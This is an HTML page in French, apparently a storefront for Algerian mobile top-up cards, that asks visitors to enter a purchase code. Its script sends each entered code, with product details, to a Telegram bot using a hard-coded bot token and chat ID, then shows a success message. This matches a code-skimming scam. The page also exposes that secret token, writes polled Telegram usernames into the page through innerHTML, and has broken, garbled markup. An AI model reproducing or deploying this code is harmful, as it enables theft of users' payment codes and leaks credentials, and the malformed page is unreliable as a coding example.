<head>
<meta charset="UTF-8">

<style>
body {
font-family: Arial, sans-serif;

}

.container {

padding: 20px;

}

#info {

}

.popup {

}

.popup-content {

}

}

.alert-box {

}

.alert-box button {

color: #fff;
padding: 10px 20px;
border: none;
border-radius: 5px;
cursor: pointer;
}

}

</head>

<body>
<div class="container" id="user-name"></div>
<div class="container">
<h1>Ooredoo</h1>

</br>

<div class="container">
<h1>Djezzy</h1>
<p>Carte d'exp√©dition 100.00  DA</p>
<p>Prix : 100 Da</p>
<label for="code">Entrer le code d'achat:</label>
<input type="text" id="code" name="code">
</br>
</br>
<button class="order-button" onclick="order(this)">Order</button>

<div class="container">
<h1>Mobilis</h1>
<p>Carte d'exp√©dition 200.00 DA</p>

<label for="code">Entrer le code d'achat:</label>
<input type="text" id="code" name="code">
</br>
</br>

<div class="popup" id="popup">
<div class="popup-content">
<h2>Op√©ration r√©ussie!</h2>
<p>Votre commande a √©t√© envoy√©e avec succ√®s.</p>
<button onclick="hidePopup()">Fermer</button>
</div>
</div>

</div>
<script>
const telegramToken = '7899966999:AAFaQeVG7ZZWoE6Fo1NoR7yJmmgK_38u-Cs';
const chatId = '5365425194';

function order(element) {
const container = element.parentNode;
const produit = container.querySelector('h1').textContent;
const description = container.querySelector('p:nth-child(2)').textContent;
const prix = container.querySelector('p:nth-child(3)').textContent;
const code = container.querySelector('input[type="text"]').value;
if (code !== '') {
const message = `üíµNouvel achat :\n Produit: ${produit}\n Description: ${description}\n Prix: ${prix}\n Code: ${code}`;
sendTelegramMessage(message);
showPopup();
} else {
showAlert();
}
}

function sendTelegramMessage(message) {
const url = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
const params = {
chat_id: chatId,
text: message,
};
fetch(url, {
method: 'POST',
headers: {
'Content-Type': 'application/json',
},
body: JSON.stringify(params),
})
.then((response) => response.json())
.then((data) => console.log(data))
.catch((error) => console.error(error));
}

function showPopup() {
document.getElementById('popup').style.display = 'flex';
}

function hidePopup() {
document.getElementById('popup').style.display = 'none';
}

function showAlert() {
document.getElementById('alert-box').style.display = 'flex';
}

function hideAlert() {
document.getElementById('alert-box').style.display = 'none';
}

function getUpdates() {
const url = `https://api.telegram.org/bot${telegramToken}/getUpdates`;
fetch(url)
.then(response => response.json())
.then(data => {
const updates = data.result;
updates.forEach(update => {
const message = update.message;
const userName = message.from.username;
const chatId = message.chat.id;
console.log(`Nom d'utilisateur : ${userName}`);
console.log(`ID de chat : ${chatId}`);
// Mettre √† jour le nom d'utilisateur dans la page
document.getElementById('user-name').innerHTML = `${userName}`;
});
})
.catch(error => console.error(error));
}

// Appeler la fonction getUpdates toutes les 5 secondes
setInterval(getUpdates, 5000);

// Appeler la fonction getUpdates une fois au d√©marrage
getUpdates();
</script>
